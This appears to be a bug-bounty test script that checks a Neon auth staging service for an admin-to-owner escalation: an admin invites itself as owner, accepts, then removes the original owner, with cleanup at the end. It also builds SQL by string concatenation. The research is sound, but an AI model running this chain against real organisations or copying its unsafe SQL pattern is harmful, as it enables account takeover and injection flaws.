# -*- coding: utf-8 -*-
"""V7c: admin->owner privilege escalation chain via owner-role invitation.
Chain if vuln: admin invites SELF as owner -> accept -> dual owner -> remove original owner -> sole owner.
Also probes: admin invite-owner of another user; admin self-invite paths."""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]
ctx = ssl.create_default_context()
DB_URI = None
PASS = "SecTest!2026pass"
U1 = "libobo1229+na_org1@gmail.com"
U2 = "libobo1229+na_org2@gmail.com"
U3 = "libobo1229+na_org3@gmail.com"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, timeout=30):
    try:
        conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
        payload = json.dumps(body) if body is not None else None
        hdrs = {"Content-Type": "application/json", "Origin": "http://localhost:3000",
                "User-Agent": "Mozilla/5.0", "Accept": "application/json",
                "X-Bug-Bounty": "xxbo"}
        if cookie:
            hdrs["Cookie"] = cookie
        conn.request(method, path, body=payload, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read().decode("utf-8", "replace")
        ck = resp.getheader("Set-Cookie", "")
        conn.close()
        time.sleep(0.6)
        return resp.status, data, ck
    except Exception as e:
        time.sleep(0.6)
        return None, str(e)[:150], ""


def auth(email):
    st, data, ck = na("POST", "/neondb/auth/sign-in/email",
                      {"email": email, "password": PASS})
    return ck.split(";")[0] if st in (200, 201) else None


def fetch_db_uri():
    global DB_URI
    try:
        conn = http.client.HTTPSConnection(API_HOST, timeout=30, context=ctx)
        conn.request("GET", API_BASE + "/projects/%s/connection_uri?database_name=neondb"
                     "&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN),
                     headers={"X-Bug-Bounty": "xxbo",
                              "Authorization": "Bearer " + APIKEY})
        resp = conn.getresponse()
        data = json.loads(resp.read().decode("utf-8", "replace"))
        conn.close()
        uri = data.get("uri")
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        parts = urlsplit(uri)
        q = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
        DB_URI = urlunsplit((parts.scheme, parts.netloc, parts.path,
                             urlencode(q), parts.fragment))
        return True
    except Exception as e:
        out("uri err %s" % str(e)[:100])
        return False


def dbq(sql):
    import psycopg
    with psycopg.connect(DB_URI, connect_timeout=15) as conn:
        with conn.cursor() as cur:
            cur.execute(sql)
            return cur.fetchall()


def members(org):
    return dbq('SELECT u.email, m.role FROM neon_auth.member m JOIN neon_auth.user u '
               'ON u.id=m."userId" WHERE m."organizationId"=%s' % ("'" + org + "'"))


def invite(org, email, role, cookie, tag):
    st, d, _ = na("POST", "/neondb/auth/organization/invite-member",
                  {"organizationId": org, "email": email, "role": role}, cookie)
    out("%-46s -> %d %s" % (tag, st, d[:180]))
    if st == 200:
        return json.loads(d).get("id")
    r = dbq('SELECT id FROM neon_auth.invitation WHERE "organizationId"=%s '
            'AND email=%s AND status=%s' % ("'" + org + "'", "'" + email + "'", "'pending'"))
    return str(r[0][0]) if r else None


def main():
    out("== V7c admin->owner escalation chain ==")
    if not fetch_db_uri():
        return
    c1, c2, c3 = auth(U1), auth(U2), auth(U3)
    out("sessions: %s" % [bool(c1), bool(c2), bool(c3)])
    if not all([c1, c2, c3]):
        return
    st, d, _ = na("POST", "/neondb/auth/organization/create",
                  {"name": "v7c-org", "slug": "v7c-%d" % int(time.time())}, c1)
    org = json.loads(d).get("id") if st == 200 else None
    out("org=%s" % org)
    if not org:
        return

    # U2 joins as admin (owner invites)
    i = invite(org, U2, "admin", c1, "S1 owner invites U2 as admin")
    st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                  {"invitationId": i}, c2)
    out("S2 U2 accepts admin                 -> %d" % st)
    out("   members: %s" % members(org))

    # S3: admin U2 invites SELF as owner (escalation attempt)
    i2 = invite(org, U2, "owner", c2, "S3 admin U2 invites SELF as owner")
    if i2:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": i2}, c2)
        out("S4 U2 accepts owner-invite        -> %d %s" % (st, d[:160]))
        out("   members after S4: %s" % members(org))
        # if U2 became owner -> try remove U1 (sole-owner takeover)
        m = members(org)
        if any(x[0] == U2 and x[1] == "owner" for x in m):
            out("   !! U2 IS OWNER - attempting U1 removal")
            m1 = dbq('SELECT m.id FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
                     'WHERE m."organizationId"=%s AND u.email=%s'
                     % ("'" + org + "'", "'" + U1 + "'"))
            st, d, _ = na("POST", "/neondb/auth/organization/remove-member",
                          {"organizationId": org, "memberIdOrEmail": str(m1[0][0])}, c2)
            out("S5 U2 removes U1                -> %d %s" % (st, d[:160]))
            out("   members after S5: %s" % members(org))
    else:
        out("S3 blocked (admin cannot invite owner) - safe")

    # S6: admin invites OTHER user (U3) as owner
    i3 = invite(org, U3, "owner", c2, "S6 admin U2 invites U3 as owner")
    if i3:
        st, d, _ = na("POST", "/neondb/auth/organization/accept-invitation",
                      {"invitationId": i3}, c3)
        out("S7 U3 accepts owner-invite        -> %d %s" % (st, d[:160]))
        out("   members after S7: %s" % members(org))

    # cleanup: delete org (owner = U1 unless escalated)
    rem = dbq('SELECT u.email FROM neon_auth.member m JOIN neon_auth.user u ON u.id=m."userId" '
              'WHERE m."organizationId"=%s AND m.role=\'owner\'' % ("'" + org + "'"))
    ck_owner = c1
    if rem and rem[0][0] == U2:
        ck_owner = c2
    elif rem and rem[0][0] == U3:
        ck_owner = c3
    st, d, _ = na("POST", "/neondb/auth/organization/delete", {"organizationId": org}, ck_owner)
    out("cleanup delete org -> %d" % st)


if __name__ == "__main__":
    main()
